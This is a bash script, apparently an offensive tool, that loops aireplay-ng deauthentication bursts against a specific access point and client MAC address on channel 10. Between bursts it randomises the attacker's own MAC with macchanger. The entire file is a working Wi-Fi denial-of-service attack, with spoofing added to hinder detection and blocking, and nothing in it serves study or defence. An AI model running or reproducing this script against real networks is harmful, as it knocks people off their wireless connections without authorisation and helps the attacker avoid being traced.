#!/bin/bash

while true
do
	iwconfig wlan0mon channel 10
#	aireplay-ng -0 10 -a 54:A0:50:D8:E9:00  wlan0mon
	aireplay-ng -0 10 -a 54:A0:50:D8:E9:00 -c 74:23:44:9E:3C:A6 wlan0mon
	ifconfig wlan0mon down
	macchanger -r wlan0mon | grep "New MAC"
	airmon-ng check kill
	ifconfig wlan0mon up

	echo waiting...
	sleep 3
done
